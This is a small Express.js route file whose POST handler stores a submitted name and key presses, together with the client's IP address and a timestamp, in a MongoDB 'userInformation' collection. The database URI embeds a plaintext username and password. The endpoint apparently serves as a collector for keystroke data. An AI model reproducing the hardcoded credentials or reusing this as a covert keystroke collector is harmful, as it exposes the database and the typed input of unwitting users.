var express = require('express');
var router = express.Router();
const { MongoClient } = require('mongodb');

const uri = "mongodb+srv://askme:Jager15@cluster0.zwcec88.mongodb.net/?retryWrites=true&w=majority";
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });

router.post('/', async function(req, res, next) {
  const name = req.body.name;
  const keys = req.body.keys;

  try {
    await client.connect();

    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const timestamp = new Date();

    const collection = client.db("admin").collection("userInformation");

    await collection.insertOne({ name, ipAddress, keyPresses: keys, timestamp });

    res.json({ message: 'Data received and saved successfully!' });
  } finally {
    await client.close();
  }
});

module.exports = router;